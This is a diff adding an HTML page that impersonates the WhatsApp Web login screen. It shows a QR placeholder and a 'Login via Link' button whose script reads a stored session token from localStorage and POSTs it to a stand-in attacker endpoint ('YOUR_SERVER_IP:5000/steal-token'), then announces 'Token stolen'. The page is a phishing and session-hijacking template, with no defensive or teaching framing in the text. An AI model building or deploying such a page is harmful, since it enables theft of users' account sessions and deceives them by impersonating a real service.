@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .qr-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 1);
+        }
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            border: 1px solid #ddd;
+            margin: 20px 0;
+            background-color: #f9f9f9;
+        }
+        .qr-text {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .login-button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #1da850;
+        }
+    </style>
+</head>
+<body>
+    <div class="qr-container">
+        <div class="qr-text">Scan the QR code with your phone to log in to WhatsApp Web</div>
+        <div class="qr-code">[QR CODE PLACEHOLDER]</div>
+        <button class="login-button" onclick="simulateLogin()">Login via Link</button>
+    </div>
+
+    <script>
+        function simulateLogin() {
+            const sessionToken = localStorage.getItem('waLoginToken');
+            if (sessionToken) {
+                fetch('http://YOUR_SERVER_IP:5000/steal-token', {
+                    method: 'POST',
+                    body: JSON.stringify({ token: sessionToken }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                alert("Login successful! (Token stolen)");
+            } else {
+                alert("Error: Could not log in. (Token not found)");
+            }
+        }
+    </script>
+</body>
+</html>
